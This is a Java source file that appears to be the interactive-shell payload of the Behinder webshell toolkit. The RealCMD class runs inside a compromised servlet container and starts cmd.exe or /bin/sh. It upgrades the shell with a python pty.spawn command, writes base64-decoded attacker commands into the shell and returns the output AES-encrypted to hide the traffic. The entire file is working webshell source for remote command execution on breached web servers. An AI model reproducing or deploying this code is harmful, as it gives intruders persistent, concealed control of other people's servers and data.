package net.rebeyond.behinder.payload.java;

import org.objectweb.asm.Opcodes;
import sun.misc.BASE64Decoder;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletOutputStream;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;
import java.io.*;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;

public class RealCMD implements Runnable {
    public static String bashPath;
    public static String cmd;
    public static String type;
    private ServletRequest Request;
    private ServletResponse Response;
    private HttpSession Session;

    public static void main(String[] args) {
    }

    public boolean equals(Object obj) {
        PageContext page = (PageContext) obj;
        this.Session = page.getSession();
        this.Response = page.getResponse();
        this.Request = page.getRequest();
        Map<String, String> result = new HashMap<>();
        try {
            result.put("msg", runCmd(page));
            result.put("status", "success");
        } catch (Exception e) {
            result.put("status", "fail");
            result.put("msg", e.getMessage());
        }
        try {
            ServletOutputStream so = this.Response.getOutputStream();
            so.write(Encrypt(buildJson(result, true).getBytes(StandardCharsets.UTF_8)));
            so.flush();
            so.close();
            page.getOut().clear();
        } catch (Exception e2) {
            e2.printStackTrace();
        }
        return true;
    }

    public RealCMD(HttpSession session) {
        this.Session = session;
    }

    public RealCMD() {
    }

    public String runCmd(PageContext page) throws Exception {
        page.getResponse().setCharacterEncoding("UTF-8");
        if (type.equals("create")) {
            this.Session.setAttribute("working", true);
            new Thread(new RealCMD(this.Session)).start();
            return "";
        } else if (type.equals("read")) {
            return ((StringBuilder) this.Session.getAttribute("output")).toString();
        } else {
            if (type.equals("write")) {
                ((StringBuilder) this.Session.getAttribute("output")).setLength(0);
                String input = new String(new BASE64Decoder().decodeBuffer(cmd));
                BufferedWriter writer = (BufferedWriter) this.Session.getAttribute("writer");
                writer.write(input);
                writer.flush();
                Thread.sleep(100);
                return "";
            } else if (!type.equals("stop")) {
                return "";
            } else {
                ((Process) this.Session.getAttribute("process")).destroy();
                return "";
            }
        }
    }

    public void run() {
        ProcessBuilder builder;
        Charset osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));
        StringBuilder output = new StringBuilder();
        try {
            String os = System.getProperty("os.name").toLowerCase();
            if (os.indexOf("windows") >= 0) {
                if (bashPath == null) {
                    bashPath = "c:/windows/system32/cmd.exe";
                }
                builder = new ProcessBuilder(bashPath);
            } else {
                if (bashPath == null) {
                    bashPath = "/bin/sh";
                }
                builder = new ProcessBuilder(bashPath);
            }
            builder.redirectErrorStream(true);
            Process process = builder.start();
            OutputStream stdin = process.getOutputStream();
            InputStream stdout = process.getInputStream();
            BufferedReader reader = new BufferedReader(new InputStreamReader(stdout, osCharset));
            BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(stdin));
            this.Session.setAttribute("reader", reader);
            this.Session.setAttribute("writer", writer);
            this.Session.setAttribute("output", output);
            this.Session.setAttribute("process", process);
            if (os.indexOf("windows") < 0) {
                writer.write(String.format("python -c 'import pty; pty.spawn(\"%s\")'", bashPath) + "\n");
                writer.flush();
            }
            byte[] buffer = new byte[Opcodes.ACC_ABSTRACT];
            while (true) {
                int length = stdout.read(buffer);
                if (length > -1) {
                    output.append(new String(Arrays.copyOfRange(buffer, 0, length)));
                } else {
                    return;
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
            output.append(e.getMessage());
        }
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key);
            if (encode) {
                if (version.compareTo("1.9") >= 0) {
                    getClass();
                    Class Base64 = Class.forName("java.util.Base64");
                    Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
                    value = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes(StandardCharsets.UTF_8));
                } else {
                    getClass();
                    Object Encoder2 = Class.forName("sun.misc.BASE64Encoder").newInstance();
                    value = ((String) Encoder2.getClass().getMethod("encode", byte[].class).invoke(Encoder2, value.getBytes(StandardCharsets.UTF_8))).replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("}");
        return sb.toString();
    }

    private byte[] Encrypt(byte[] bs) throws Exception {
        SecretKeySpec skeySpec = new SecretKeySpec(this.Session.getAttribute("u").toString().getBytes(StandardCharsets.UTF_8), "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        return cipher.doFinal(bs);
    }
}
